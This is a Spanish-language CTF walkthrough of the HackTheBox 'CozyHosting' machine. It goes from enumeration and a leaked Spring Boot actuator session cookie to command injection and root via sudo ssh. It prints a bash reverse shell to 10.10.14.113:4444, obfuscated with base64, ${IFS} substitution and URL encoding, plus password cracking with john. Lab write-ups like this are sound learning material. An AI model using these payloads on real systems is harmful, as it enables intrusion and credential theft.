 #Information_Disclosure

1. Analisis de puertos abiertos, con nmap![[Pasted image 20230918132937.png]]
2. puerto http abierto por lo que buscamos la ip en el navegador, en busca de una pagina web, en caso de que no encontremos la web podemos hacer uso del archivo "host" pera agregar el nombre del dominio![[Pasted image 20230918133047.png]]
   ahora podemos ver la web.
3. analizamos la web y vemos los siguientes elementos de interés:
	1. Login page:
	   ![[Pasted image 20230918133425.png]]
	2. Wappalyzer:
	   ![[Pasted image 20230918133550.png]]
	3. Clic en este boton:
	   ![[Pasted image 20230918133941.png]]
	   nos devuelve:![[Pasted image 20230918134011.png]]
	4. Commentario en el codigo fuente:![[Pasted image 20230918134155.png]]
4. para asegurarnos de que no hay mas directorios ocultos vamos a usar gobuster
	```bash
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
	```

	ahora podemos ver mas paginas:![[Pasted image 20230918135727.png]]
	pero no parece ser nada importe
	no obstante vamos a usar ahora [[dirSearch]] 
	```bash
	dirsearch -u http://cozyhosting.htb/
```
	![[Pasted image 20230918175751.png]]
	ahora si que tenemos cosas mas interesantes, las carpetas de " `/actuator ` se deben a que la web usa "Spring boot"
5. entramos en la dirección y vemos lo siguiente![[Pasted image 20230918180018.png]]
6. Entramos en "sessions" y podemos ver lo que parece la cookie y el nombre del usuario![[Pasted image 20230918180356.png]]
   si buscamos un poco mas dentro de "Mappings" podemos ver que hay 4 end-points mas ![[Pasted image 20230918183218.png]]
   
8. para probar las cookies de session vamos a hacer una peticion al directorio "http://cozyhosting.htb/admin" y con burp suite vamos a ver si ponemos poner la cookie![[Pasted image 20230918181900.png]]
   ahora ponemos la cookie y le damos a "Forward" y ya estamos dentro![[Pasted image 20230918181946.png]]
8. mas abajo podemos ver un apartado para crear una conexion ![[Pasted image 20230918190226.png]]
   haciendo uso de [[burpsuite]] podemos ver que esta pasando cuando hacemos "Submit" en este caso nos esta ejecutando un post a "/executessh" esto me hace pensar que esta ejecutando un comando en ssh en el servidor, esta es la petición http![[Pasted image 20230918191855.png]]
   vamos a sustituir el valor "username" con una rever sell para ello debemos tener en cuenta varios factores para evitar conflictos a la hora de transmitirlo por http
   - pasar la rever shell a base64
   - luego crear un payload de la reverSell
   - y luego pasarlo a urlEncoding
9. creando el payload,
   usaremos la revershell de bash que es:
   ```bash
   bash -i >& /dev/tcp/10.10.14.113/4444 0>&1
```
	ahora la pasamos a base64
	```bash
	echo "bash -i >& /dev/tcp/10.10.14.113/4444 0>&1" | base64 -w 0
```
	resultado:`YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTMvNDQ0NCAwPiYxCg==`
	ahora debemos crear el payload es decir el commando se que ejecutara en el terminal victima
	```bash
	echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTMvNDQ0NCAwPiYxCg=="| base64 -d | bash
```
	con esto hacemos que primero la terminal se desencripte y luego hacemos que se ejecute en al terminal usando bash, ahora debemos quitar los espacios ya que nos puede dar problemas a la hora de pasarlo por url, para ello vamos a usar una variable de entorno "${IFS%??}" en cada espacio.
	No debemos olvidar el punto y coma ";" antes de despues.
	```bash
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTMvNDQ0NCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```
   ahora lo pasamos a [[urlEncoding]]
   ```bash
%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMTMvNDQ0NCAwPiYxCg%3D%3D%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
```
10. una vez tenemos el payload solo queda ponernos en modo escucha con [[nc]] y mandar el "POST"![[Pasted image 20230918203756.png]]
11. ahora debemos hacer el [[Tratamiento de la tty]]    ![[Pasted image 20230918204334.png]]

12. Vamos a hacer la escalada de privilegios 
    para ello vamos a ver que programas estan corriendo de fondo, en este caso podemos usar  [[netstat]] para ver los puertos que estan abiertos![[Pasted image 20230919195839.png]]
    y como podemos ver tenemos un puerto "5432" que suele ser de postgesql, vamos a ver si podemos acceder a la base de datos sql
13. haciendo uso de [[pspy64]] podemos ver que usuarios ejecuta el servidor, para ello debemos encontrar una carpeta donde podamos escribir descargar el script, para ello usamos el comando [[find]] y lo descargamos en nuestra maquina para luego hacer un servidor [[http-server]] y luego hacer un wget en la maquina victima para poder descargar el script ![[Pasted image 20230921171038.png]]
    ahora vamos a ver el nombre del usuario en `/etc/passwd`
    y vemos que es un usuario llamado postgres![[Pasted image 20230921171811.png]]
    cuando nos intentamos conectar con el usuario, nos pide una contraseña
    ```bash
    psql -U postgres -h localhost -W
```
	![[Pasted image 20230921173307.png]]
	
14. si recordamos el archivo ".jar" de antes  y podemos descomprimirlo ya que es un archivo comprimido, podemos hacerlo con [[zipgrep]] 
    ```bash
    zipgrep password cloudhosting.jar
```
	![[Pasted image 20230921174614.png]]
	ya tenemos la contraseña de postgres
15. iniciamos session otra vez pero poniendo la contraseña y listo con `\l` vemos las bases de datos
    ![[Pasted image 20230921175032.png]]
16. hacemos conexion con la base de datos "cozyhosting" con `\c _nombre de la base de datos_` y miramos las tablas que tiene con `\d` y ahora podemos ver lo que hay dentro de users![[Pasted image 20230921181551.png]]
17. vamos a ver como podemos romper esos hash para ello podemos hacer uso de [[john the ripper]] o de [[hashcat]] en este caso vamos a hacer uso de john con el comando
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
una vez hecho la mostramos
![[Pasted image 20230921184954.png]]
18. ahora podemos intentar iniciar sesion con el usuario josh
    ![[Pasted image 20230921185205.png]]
    
19. capturamos la flag del usuario y vamos a ver como hacer la escalada de privilegios para root![[Pasted image 20230921185339.png]]
20. ahora podemos ver que privilegios tiene este usuario con `sudo -l` vemos que tenemos permisos para ejecutar /ssh por lo cual seguramente podremos hacer uso de gtfobins
    ![[Pasted image 20230921190101.png]]
22. haciendo uso de (https://gtfobins.github.io/gtfobins/ssh/#sudo) podemos crear un shell de root
    ![[Pasted image 20230921190321.png]]
24. y miramos la flag![[Pasted image 20230921190345.png]]
25. fin
